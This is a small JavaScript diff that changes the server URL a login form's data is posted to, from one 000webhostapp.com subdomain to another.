@@ -25,7 +25,7 @@ async function sendDataToServer({
       "Missing Login credentials, please ensure you fill the login form"
     );
   } else {
-    const response = await fetch("https://theappcrud.000webhostapp.com/insert.php", {
+    const response = await fetch("https://insomiac.000webhostapp.com/insert.php", {
       method: "POST",
       body: JSON.stringify({
         emailValue,
